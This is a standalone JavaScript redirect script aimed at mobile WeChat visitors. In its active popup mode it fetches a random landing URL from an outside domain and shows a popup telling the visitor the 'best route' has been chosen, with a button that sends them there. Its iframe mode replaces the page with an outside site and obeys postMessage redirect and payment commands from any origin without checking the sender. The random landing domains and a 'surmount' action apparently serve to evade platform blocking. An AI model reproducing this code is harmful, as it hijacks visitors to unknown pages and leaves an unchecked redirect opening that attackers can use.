;(function () {
    const jump_type = ["now", "delay", "popup", "iframe"]
    const jump_method = jump_type[2]
    const jump_delay = 2500
    const isMobileWeChatWithSensors = () => {
		return true
        const ua = navigator.userAgent
        const urlParams = new URLSearchParams(window.location.search)
        const action = urlParams.get("a")
        const isMobile = /Android|iPhone|OpenHarmony|iPad/i.test(ua)
        if (action == "extalipay" || action == "extkefu") {
            if (isMobile) {
                return true
            }
        }
        if (!isMobile) {
            return false
        }
        const isWeChat = /MicroMessenger\/8/i.test(ua)
        if (!isWeChat) {
            return false
        }
        const hasTouchSupport = "ontouchstart" in window || navigator.maxTouchPoints > 0
        if (!hasTouchSupport) {
            return false
        }
        return true
    }
    const ApiClient = {
        get: async function (url, params = {}) {
            const queryString = new URLSearchParams(params).toString()
            const fullUrl = queryString ? `${url}?${queryString}` : url
            try {
                const response = await fetch(fullUrl, { method: "GET", headers: { "Content-Type": "application/json" } })
                if (!response.ok) {
                    const errorText = await response.text()
                    throw new Error(`HTTP error! Status: ${response.status} - ${errorText}`)
                }
                const result = await response.json()
                return result.data
            } catch (error) {
                console.error("API GET request failed:", error)
                throw error
            }
        },
    }
    const ShowMainPage = () => {
        try {
            document.querySelector("#overlay").style.display = "none"
            document.querySelector("#loading_box").style.display = "none"
            document.body.style.overflow = "auto"
        } catch (error) {}
    }
    if (isMobileWeChatWithSensors() == false) {
        ShowMainPage()
        return
    }

    if (jump_method == "now" || jump_method == "delay" || jump_method == "popup") {
        const searchParams = new URLSearchParams(window.location.search)
        const queryString = searchParams.toString()
		//alert(1);
		console.log("https://zsyj.xdwxe.cn/frontapi/project.index/randomLanding/?rnd=" + Math.random() + "&" + queryString)
        ApiClient.get("https://zsyj.xdwxe.cn/frontapi/project.index/randomLanding/?rnd=" + Math.random() + "&" + queryString)
            .then((data) => {
                try {
                    if (!data) {
                        ShowMainPage()
                        return
                    }
                    let share_url = data.share_url || ""
                    if (!share_url) {
                        ShowMainPage()
                        return
                    }
                    if (jump_method == "now") {
                        location.replace(share_url)
                        return
                    }
                    if (jump_method == "delay") {
                        setTimeout(() => {
                            location.replace(share_url)
                        }, jump_delay)
                        return
                    }
                    if (jump_method == "popup") {
                        document.querySelector("#loading_box").style.display = "none"
                        //创建一个弹出窗口，圆角，白色背景，居中显示，显示一个按钮，按钮要美化立体一些，点击按钮跳转到share_url
                        const popup = document.createElement("div")
                        popup.style.position = "fixed"
                        popup.style.top = "50%"
                        popup.style.left = "50%"
                        popup.style.width = "70%"
                        popup.style.transform = "translate(-50%, -50%)"
                        popup.style.backgroundColor = "white"
                        popup.style.borderRadius = "8px"
                        popup.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)"
                        popup.style.zIndex = "1000000"
                        popup.style.padding = "20px 20px 20px 20px"
                        popup.style.textAlign = "center"
                        const tip_title = document.createElement("div")
                        tip_title.innerText = "已为您选择最优线路"
                        tip_title.style.padding = "5px 0px 10px 0px"
                        tip_title.style.textAlign = "center"
                        tip_title.style.color = "#747a87"
                        const tip_message = document.createElement("div")
                        tip_message.innerText = "请点击下方的按钮进入"
                        tip_message.style.padding = "0px 0px 10px 0px"
                        tip_message.style.marginBottom = "15px"
                        tip_message.style.textAlign = "center"
                        tip_message.style.color = "#747a87"
                        //创建一个按钮
                        const button = document.createElement("button")
                        button.innerText = "点 击 进 入"
                        button.style.backgroundColor = "#4CAF50"
                        button.style.color = "white"
                        button.style.border = "none"
                        button.style.borderRadius = "4px"
                        button.style.padding = "10px 20px 13px 20px"
                        button.style.cursor = "pointer"
                        button.style.width = "88%"
                        button.style.fontSize = "16px"
                        button.onclick = () => {
                            location.replace(share_url)
                        }
                        popup.appendChild(tip_title)
                        popup.appendChild(tip_message)
                        popup.appendChild(button)
                        document.body.appendChild(popup)
                    }
                } catch (error) {
                    console.error("Error processing random landing data:", error)
                }
            })
            .catch((error) => {
                console.error("Error fetching random landing data:", error)
            })
    }
    if (jump_method == "iframe") {
        // 移除body内的所有元素
        document.body.innerHTML = ""
        let childIframe = document.createElement("iframe")
        childIframe.id = "childIframe"
        childIframe.src = "about:blank"
        childIframe.style.width = "100%"
        childIframe.style.height = "100vh"
        childIframe.style.border = "none"
        childIframe.style.position = "absolute"
        childIframe.style.top = "0"
        childIframe.style.left = "0"
        childIframe.style.right = "0"
        childIframe.style.bottom = "0"
        childIframe.style.zIndex = "1999999"
        document.body.appendChild(childIframe)
        const childIframeSrc = "https://mobile.xdwxe.cn"
        const childIframeObj = document.getElementById("childIframe")
        const urlParams = new URLSearchParams(window.location.search)
        const action = urlParams.get("a")
        const path = decodeURIComponent(urlParams.get("c"))
        const token = urlParams.get("token")
        const sendMessageToIframe = (messageContent) => {
            if (childIframeObj.contentWindow) {
                childIframeObj.contentWindow.postMessage(messageContent, "*")
            } else {
                console.error("unable to send message, iframe contentWindow is not available.")
            }
        }
        window.addEventListener("message", function (event) {
            const receivedData = event.data
            if (receivedData && receivedData.action) {
                switch (receivedData.action) {
                    case "navigate":
                    case "pay_wechat":
                    case "pay_alipay":
                        if (receivedData.url) {
                            location.replace(receivedData.url)
                        }
                        break
                    case "pay_alipay_ext":
                        if (receivedData.url) {
                            let path_name = location.pathname == "/" ? "/" : location.pathname
                            path_name = path_name.replace("//", "/")
                            location.replace(location.origin + path_name + "?a=extalipay&c=" + receivedData.url)
                        }
                        break
                    case "get_box_info":
                        let path_name = location.pathname == "/" ? "" : location.pathname
                        path_name = path_name.replace("//", "/")
                        sendMessageToIframe({ action: "box_init", box_domain: location.hostname + path_name })
                        break
                    default:
                        console.warn("Unknown Action !")
                }
            }
        })
        const main_run = () => {
            if (action) {
                if ((action == "surmount" || action == "extalipay") && path) {
                    const fullPath = childIframeSrc + path
                    childIframeObj.src = fullPath
                    return
                }
                if ((action == "oalogin" || action == "invite_oalogin") && path && token) {
                    const fullPath = childIframeSrc + path + "?token=" + token
                    childIframeObj.src = fullPath
                    return
                }
                childIframeObj.src = childIframeSrc
            } else {
                childIframeObj.src = childIframeSrc
            }
        }
        main_run()
    }
})()

